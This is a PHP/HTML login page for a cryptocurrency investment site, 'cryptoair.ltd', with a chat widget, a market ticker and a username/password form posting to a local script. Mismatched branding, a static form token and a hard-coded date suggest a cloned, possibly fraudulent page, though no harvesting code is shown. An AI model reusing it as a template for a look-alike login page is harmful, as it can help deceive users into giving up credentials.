<?php
include "validate.php";
?>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=1280" />
    <title>cryptoair.ltd</title>

    <link rel="stylesheet" href="style.css" />

    <link
      rel="apple-touch-icon"
      sizes="180x180"
      href="https://cryptoair.ltd/assets/favicon/apple-touch-icon.png?v=13!z!13"
    />
    <link
      rel="icon"
      type="image/png"
      sizes="32x32"
      href="https://cryptoair.ltd/assets/favicon/favicon-32x32.png?v=13!z!13"
    />
    <link
      rel="icon"
      type="image/png"
      sizes="16x16"
      href="https://cryptoair.ltd/assets/favicon/favicon-16x16.png?v=13!z!13"
    />
    <link
      rel="manifest"
      href="https://cryptoair.ltd/assets/favicon/site.webmanifest?v=13!z!13"
    />
    <link
      rel="mask-icon"
      href="https://cryptoair.ltd/assets/favicon/safari-pinned-tab.svg?v=13!z!13"
      color="#5bbad5"
    />
    <link
      rel="shortcut icon"
      href="https://cryptoair.ltd/assets/favicon/favicon.ico?v=13!z!13"
    />
    <meta name="msapplication-TileColor" content="#2d89ef" />
    <meta
      name="msapplication-config"
      content="https://cryptoair.ltd/assets/favicon/browserconfig.xml"
    />
    <meta name="theme-color" content="#ffffff" />
    <script
      type="text/javascript"
      charset="utf-8"
      async=""
      src="https://www.smartsuppchat.com/loader.js?"
    ></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <!-- Smartsupp Live Chat script -->
    <script type="text/javascript">
      var _smartsupp = _smartsupp || {};
      _smartsupp.key = "e9aa8bc106a5cc223ed02945611249cf82f2c717";
      window.smartsupp ||
        (function (d) {
          var s,
            c,
            o = (smartsupp = function () {
              o._.push(arguments);
            });
          o._ = [];
          s = d.getElementsByTagName("script")[0];
          c = d.createElement("script");
          c.type = "text/javascript";
          c.charset = "utf-8";
          c.async = true;
          c.src = "https://www.smartsuppchat.com/loader.js?";
          s.parentNode.insertBefore(c, s);
        })(document);
    </script>
  </head>
  <body>
    <div
      id="chat-application"
      style="
        display: block;
        z-index: 2147483647;
        position: fixed;
        overflow: hidden;
        bottom: 24px;
        left: initial;
        right: 11px;
        max-height: 310px;
        max-width: 265px;
        height: 310px;
        width: 265px;
        background: transparent;
      "
    >
      <iframe
        id="chat-application-iframe"
        title="Smartsupp"
        aria-hidden="true"
        style="
          width: 100%;
          height: 100%;
          border: none;
          position: absolute;
          left: 0px;
          z-index: 10000001;
        "
      ></iframe>
    </div>

    <script type="text/javascript">
      $(document).ready(function () {
        $(".accordion>dl>dt>a").click(function () {
          $(this).toggleClass("rotate0");
        });
      });

      $(".language").click(function () {
        $(this).toggleClass("active");
      });

      $(".mobileMenu").click(function () {
        $(".menu").toggleClass("mobile");
        $(this).toggleClass("rotate");
      });
    </script>

    <div class="wrapper a-cust-plans">
      <header class="page-header">
        <div class="page-header__bar">
          <div class="container flex-wr">
            <div class="flex-wr__col h-rate">
              <i class="ic-sm ic-sm--time"></i>
              <span>Server Time :</span>
              <b id="date">Jul 24, 2022</b>
              <script>
                $("#date").text(new Date().toLocaleDateString());
              </script>
            </div>
            <!--
      <div class="flex-wr__col flex-wr__col--stretch h-rate">
        <i class="ic-sm ic-sm--btc-rate"></i>
        <span>FIX RATE 1 BTC =</span>
        <b><b id="price_btc">$0.000</b></b>
      </div>
      <div class="flex-wr__col">
        Follow us on Social Media
        <a target="_blank" href="https://www.facebook.com/" class="ic-sm ic-sm--fb ic-sm--soc"></a>
        <a target="_blank" href="https://twitter.com/" class="ic-sm ic-sm--tw ic-sm--soc"></a>
      </div>
      <div class="flex-wr__col">
        <a href="https://cryptoair.ltd/?a=cust&page=rate" class="rate-btn">Rate Us</a>
      </div>-->
          </div>
        </div>
        <div class="container page-header__main">
          <a href="https://cryptoair.ltd/" class="page-header__logo">
            <img
              src="https://cryptoair.ltd/assets/img/logo.png"
              alt="CryptoBoom"
            />
          </a>
          <div id="google_translate_element"></div>
          <script type="text/javascript">
            function googleTranslateElementInit() {
              new google.translate.TranslateElement(
                {
                  pageLanguage: "en",
                },
                "google_translate_element"
              );
            }
          </script>
          <script
            type="text/javascript"
            src="https://cryptoair.ltd//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"
          ></script>
          <!-- <div class="page-header__lang">
      <nav class="lang">
        <div class="lang__current">
          <div class="lang__item">
            <i class="flag flag-gb"></i>
            <span>EN</span>
          </div>
        </div>
        <ul class="lang__list">
          <li>
            <a href="https://cryptoair.ltd/?language=en" class="lang__item">
              <i class="flag flag-gb"></i>
              <span>EN</span>
            </a>
          </li>
          <li>
            <a href="https://cryptoair.ltd/?language=ru" class="lang__item">
              <i class="flag flag-ru"></i>
              <span>RU</span>
            </a>
          </li>
        </ul>
      </nav>
    </div>-->

          <nav class="page-header__nav page-nav">
            <ul>
              <li class="page-nav__item">
                <a href="https://cryptoair.ltd/">Home</a>
              </li>
              <li class="page-nav__item">
                <a href="https://cryptoair.ltd/?a=cust&amp;page=about"
                  >About Us</a
                >
              </li>
              <!-- <li class="page-nav__item"><a href="https://cryptoair.ltd/?a=cust&page=plans">Plans</a></li>-->
              <li class="page-nav__item">
                <a href="https://cryptoair.ltd/?a=faq">FAQ</a>
              </li>
              <li class="page-nav__item">
                <a href="https://cryptoair.ltd/?a=support">Support</a>
              </li>
              <li class="page-nav__item page-nav__item--sign">
                <a href="https://cryptoair.ltd/?a=signup"
                  ><i class="ic-sign ic-sign--up"></i>Sign Up</a
                >
              </li>
              <li class="page-nav__item page-nav__item--sign">
                <a href="https://cryptoair.ltd/?a=login"
                  ><i class="ic-sign ic-sign--in"></i>Login&nbsp;&nbsp;</a
                >
              </li>
            </ul>
          </nav>
        </div>

        <div class="tradingview-widget-container">
          <div class="tradingview-widget-container__widget"></div>
          <script
            type="text/javascript"
            src="https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js"
            async=""
          >
            {
                "symbols": [{
                        "title": "S&P 300",
                        "proName": "INDEX:SPX"
                    },
                    {
                        "title": "Shanghai Composite",
                        "proName": "INDEX:XLY0"
                    },
                    {
                        "title": "EUR/USD",
                        "proName": "FX_IDC:EURUSD"
                    },
                    {
                        "title": "BTC/USD",
                        "proName": "BITFINEX:BTCUSD"
                    },
                    {
                        "title": "ETH/USD",
                        "proName": "BITFINEX:ETHUSD"
                    }
                ],
                "colorTheme": "dark",
                "isTransparent": false,
                "displayMode": "adaptive",
                "locale": "en"
            }
          </script>
        </div>
      </header>

      <main class="page-main">
        <div class="page-title">
          <div class="container">
            <h1>account access</h1>
            <p>In this section you can enter your personal account.</p>
          </div>
        </div>

        <div class="container-sm">
          <div class="alert alert--info alert--secure">
            In order to log in to your personal account, enter the nickname you
            specified during registration, password and captcha. After
            confirmation of this procedure, you will automatically go to your
            personal account.
          </div>

          <div class="bl-title"><span>login credentials</span></div>

          <form
            class="form-wr"
            method="post"
            name="mainform"
            id="login-form"
            action="login.php"
          >
            <input type="hidden" name="form_id" value="16586429026425" /><input
              type="hidden"
              name="form_token"
              value="e6b2be239eeb7d564fa58a9d9a8bbd70"
            />

            <div class="form-wr__col">
              <label for="username">Username</label>
              <input
                type="text"
                placeholder="Enter your username"
                name="username"
                value=""
                id="username"
              />
            </div>

            <div class="form-wr__col">
              <label for="password">Password</label>
              <input
                type="password"
                id="password"
                name="password"
                placeholder="Enter your password"
              />

              <a
                href="https://cryptoair.ltd/?a=forgot_password"
                class="form-link"
                >forgot your password?</a
              >
            </div>
            <div class="form-wr__btn-bl">
              <button class="btn" style="min-width: 200px">submit</button>
            </div>

            <input type="hidden" name="a" value="do_login" />
            <input type="hidden" name="follow" value="" />
            <input type="hidden" name="follow_id" value="" />
          </form>
        </div>
      </main>
    </div>
    <!--<style>
      #myBtn {
    display: none;
    position: fixed;
    bottom: 0px;
    right: 0px;
    z-index: 99;
    font-size: 18px;
    border: none;
    border-color:none;
    outline: none;
    background-color: transparent;
    color: white;
    cursor: pointer;
    padding: 15px;
    border-radius: 4px;
}
     
  </style>
<div id="myBtn" title="Go to top" class="" style="display: block;">
<iframe src="https://fadas.club/cryptoair.html" width="250px" height="250px" frameBorder="0" scrolling="no">
</iframe>
</div>-->

    <footer class="page-footer">
      <div class="container">
        <div class="page-footer__main">
          <div class="page-footer__col">
            <img
              src="https://cryptoair.ltd/assets/img/footer_logo.png"
              width="169"
              alt=""
            />
          </div>

          <div class="page-footer__col page-footer__nav-wr">
            <ul class="page-footer__nav">
              <li><a href="https://cryptoair.ltd/">Home</a></li>
              <li>
                <a href="https://cryptoair.ltd/?a=cust&amp;page=about"
                  >About us</a
                >
              </li>
              <!-- <li><a href="https://cryptoair.ltd/?a=cust&page=plans">plans</a></li>-->
              <li><a href="https://cryptoair.ltd/?a=rules">Rules</a></li>
            </ul>
            <ul class="page-footer__nav">
              <!--<li><a href="https://cryptoair.ltd/?a=cust&page=banners">Banners</a></li>
          <li><a href="https://cryptoair.ltd/?a=cust&page=rate">Rate Us</a></li>-->
              <li><a href="https://cryptoair.ltd/?a=faq">FAQ</a></li>
              <li><a href="https://cryptoair.ltd/?a=support">Support</a></li>
            </ul>
            <ul class="page-footer__nav">
              <li><a href="https://cryptoair.ltd/?a=signup">Sign Up</a></li>
              <li><a href="https://cryptoair.ltd/?a=login">Login</a></li>
            </ul>
          </div>

          <!-- <div class="page-footer__col">
        <div class="page-footer__title">Social Media</div>
        <a href="https://www.facebook.com/groups/cryptbm/" target="_blank" class="ic-lg ic-lg--fb ic-lg--soc"></a>
        <a href="https://twitter.com/cryptbm" target="_blank" class="ic-lg ic-lg--tw ic-lg--soc"></a>
      </div>-->

          <div class="page-footer__col">
            <div class="page-footer__title">Company Address</div>
            <div>
              24 Melbury Road, London,<br />
              England, W14 8AE
            </div>
          </div>

          <div class="page-footer__col">
            <div class="page-footer__title">
              <!--Phone and-->
              mail
            </div>
            <!--<div>+442039368123</div>-->
            <a href="mailto:support@cryptoair.ltd">support@cryptoair.ltd</a>
          </div>
        </div>
      </div>

      <div class="page-footer__btm">
        Copyright © 2020. cryptoair.ltd. All Rights Reserved
      </div>
    </footer>
    <script src="/script.js"></script>

    <script type="text/javascript">
      _js.HomePage();
      _js.calc();
    </script>

    <script type="text/javascript">
      _js.FaqPage();
    </script>

    <script>
      _js.banners();
    </script>
  </body>
</html>
